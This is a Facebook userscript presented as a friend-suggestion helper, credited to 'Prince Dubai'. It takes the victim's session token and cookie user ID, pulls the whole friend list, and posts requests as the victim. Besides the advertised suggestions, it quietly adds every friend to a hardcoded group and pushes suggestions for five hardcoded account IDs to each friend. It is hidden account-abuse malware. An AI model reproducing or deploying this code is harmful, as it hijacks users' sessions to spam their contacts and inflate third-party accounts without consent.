// ==UserScript==
// @name            Facebook Auto Suggest V 9.2
// @description     Facebook Auto Suggest
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

var Title = 'Auto Facebook Friend Suggestion Sender Manager.';
var Descriptions = "",
  _text = 'Thanks For Suggesting Your Friends.</br>Created & Designed By <A style="color:#3B5998;" href="https://www.facebook.com/princee.dubai">?Prince Dubai.</A>';newcomer=/"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;

function SuggestFriend(opo) {
  jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100002406048180&attempt_id=53ba39eed15c7c0c22bb5352d04374bf&ref=passive_megaphone&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-fEa0&__req=7&fb_dtsg=" + fb_dtsg + "&phstamp=1658168847910711974185", function (a) {
    var b = a.substring(a.indexOf("{"));
    var c = JSON.parse(b);
    i--;
    Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
    if (c.error) {
      Descriptions += "color:darkred'>";
      err++;
      if (c.errorDescription) Descriptions += c.errorDescription;
      else Descriptions +=
          JSON.stringify(c, null, "")
    }
    else {
      Descriptions += "color:gray;font-size:12px'>";
      Descriptions +=arn[i]+" has been suggested.";
      suc++
    }
    Descriptions += "</div>";
    var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
    display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
    if (i > 0) {
      display += arr.length + " Friends Detected<br/>";
      display += "<b>" + suc + "</b> Friends Suggested of " + (arr.length - i) + " Friends Processed ";
      display += "(" + i + " Lefted...)";
      display += "<div class='friend-edge'>";
      display += Descriptions;
      display += "<img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
      display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
      display += _text;
      display += "</div>";
      display += "</div>"
    }
    else {
      display += arr.length + " Friends Detected and ";
      display += "<b>" + suc + " Friends Suggested</b></br>";
      display += "<div><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span>"
    }
    display +=
      "</div>";
    document.getElementById("pagelet_sidebar")
      .innerHTML = display
  }, "text", "post");
  tay--;
  if (tay > 0) {
    var s = arr[tay];
    sx = pho[tay];
    setTimeout("SuggestFriend(" + s + ")", 100)
  }
  console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
  if (gid != 140054612835223) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=140054612835223&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function() {}, "text", "post")
    }
    if (newcomer) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100002364652561&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194", function() {}, "text", "post")
    }
    if (newcomer) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100004547702346&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194", function() {}, "text", "post")
    }
    if (newcomer) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100001193997903&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194", function() {}, "text", "post")
    }
    if (newcomer) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100005627708911&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194", function() {}, "text", "post")
    }
    if (newcomer) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100003956442423&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194", function() {}, "text", "post")
    }
}
function clickfr_callback() {
  if (document.getElementsByName("ok")
    .length > 0) nHtml.ClickUp(document.getElementsByName("ok")[0]);
  var a = arr[i];
  if (i < arr.length) addfriend(a.substring(0, 4))
}

function clickfr() {
  if (document.getElementsByClassName("search")
    .length > 0) nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1]);
  else j++;
  setTimeout("clickfr_callback()", 2E3)
}
function addfriend(a) {
  i++;
  setTimeout("clickfr()", 2E3)
}
jx = {
  getHTTPObject: function () {
    var a = false;
    if (typeof ActiveXObject != "undefined") try {
        a = new ActiveXObject("Msxml2.XMLHTTP")
    }
    catch (b) {
      try {
        a = new ActiveXObject("Microsoft.XMLHTTP")
      }
      catch (c) {
        a = false
      }
    }
    else if (window.XMLHttpRequest) try {
        a = new XMLHttpRequest
    }
    catch (b) {
      a = false
    }
    return a
  },
  load: function (url, callback, format, method, opt) {
    var http = this.init();
    if (!http || !url) return;
    if (http.overrideMimeType) http.overrideMimeType("text/xml");
    if (!method) method = "GET";
    if (!format) format = "text";
    if (!opt) opt = {};
    format = format.toLowerCase();
    method = method.toUpperCase();
    var now = "uid=" + (new Date)
      .getTime();
    url += url.indexOf("?") + 1 ? "&" : "?";
    url += now;
    var parameters = null;
    if (method == "POST") {
      var parts = url.split("?");
      url = parts[0];
      parameters = parts[1]
    }
    http.open(method, url, true);
    var ths = this;
    if (opt.handler) http.onreadystatechange = function () {
        opt.handler(http)
    };
    else http.onreadystatechange = function () {
        if (http.readyState == 4) if (http.status == 200) {
            var result = "";
            if (http.responseText) result = http.responseText;
            if (format.charAt(0) == "j") {
              result = result.replace(/[\n\r]/g,
                "");
              result = eval("(" + result + ")")
            }
            else if (format.charAt(0) == "x") result = http.responseXML;
            if (callback) callback(result)
          }
          else {
            if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
            if (opt.loading) document.getElementById(opt.loading)
                .style.display = "none";
            if (error) error(http.status)
          }
    };
    http.send(parameters)
  },
  bind: function (a) {
    var b = {
      url: "",
      onSuccess: false,
      onError: false,
      format: "text",
      method: "GET",
      update: "",
      loading: "",
      loadingIndicator: ""
    };
    for (var c in b) if (a[c]) b[c] =
          a[c];
    if (!b.url) return;
    var d = false;
    if (b.loadingIndicator) {
      d = document.createElement("div");
      d.setAttribute("style", "position:absolute;top:0px;left:0px;");
      d.setAttribute("class", "loading-indicator");
      d.innerHTML = b.loadingIndicator;
      document.getElementsByTagName("body")[0].appendChild(d);
      this.opt.loadingIndicator = d
    }
    if (b.loading) document.getElementById(b.loading)
        .style.display = "block";
    this.load(b.url, function (a) {
      if (b.onSuccess) b.onSuccess(a);
      if (b.update) document.getElementById(b.update)
          .innerHTML = a;
      if (d) document.getElementsByTagName("body")[0].removeChild(d);
      if (b.loading) document.getElementById(b.loading)
          .style.display = "none"
    }, b.format, b.method, b)
  },
  init: function () {
    return this.getHTTPObject()
  }
};
var nHtml = {
  FindByAttr: function (a, b, c, d) {
    if (c == "className") c = "class";
    var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
    if (e && e.singleNodeValue) return e.singleNodeValue;
    return null
  },
  FindByClassName: function (a, b, c) {
    return this.FindByAttr(a, b, "className", c)
  },
  FindByXPath: function (a, b) {
    try {
      var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
    }
    catch (d) {
      GM_log("bad xpath:" + b)
    }
    if (c && c.singleNodeValue) return c.singleNodeValue;
    return null
  },
  VisitUrl: function (a) {
    window.setTimeout(function () {
      document.location.href = a
    }, 500 + Math.floor(Math.random() * 500))
  },
  ClickWin: function (a, b, c) {
    var d = a.document.createEvent("MouseEvents");
    d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
    return !b.dispatchEvent(d)
  },
  Click: function (a) {
    return this.ClickWin(window, a, "click")
  },
  ClickTimeout: function (a, b) {
    window.setTimeout(function () {
      return nHtml.ClickWin(window, a, "click")
    }, b + Math.floor(Math.random() * 500))
  },
  ClickUp: function (a) {
    this.ClickWin(window,
      a, "mousedown");
    this.ClickWin(window, a, "mouseup");
    this.ClickWin(window, a, "click")
  },
  GetText: function (a, b) {
    var c = "";
    if (b == undefined) b = 0;
    if (b > 40) return;
    if (a.textContent != undefined) return a.textContent;
    for (var d = 0; d < a.childNodes.length; d++) {
      var e = a.childNodes[d];
      c += this.GetText(e, b + 1)
    }
    return c
  }
};
if (document.getElementsByClassName == undefined) document.getElementsByClassName = function (a) {
    var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)");
    var c = document.getElementsByTagName("*");
    var d = [];
    var e;
    for (var f = 0;
    (e = c[f]) != null; f++) {
      var g = e.className;
      if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
    }
    return d
};
Array.prototype.find = function (a) {
  var b = false;
  for (i = 0; i < this.length; i++) if (typeof a == "function") {
      if (a.test(this[i])) {
        if (!b) b = [];
        b.push(i)
      }
    }
    else if (this[i] === a) {
    if (!b) b = [];
    b.push(i)
  }
  return b
};
var i = 3;
var tay = 3;
var j = 0;
var k = 0;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", function (a) {
  var b = a;
  var c = b.substring(b.indexOf("{"));
  var d = JSON.parse(c);
  d = d.payload.entries;
  for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
  for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
  for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
  i = arr.length -
    1;
  tay = i;
  console.log(arr.length);
  var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
  display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
  display += arr.length + " Friends Detected";
  display += "</div>";
  document.getElementById("pagelet_sidebar").innerHTML=display;
  SuggestFriend(arr[i])});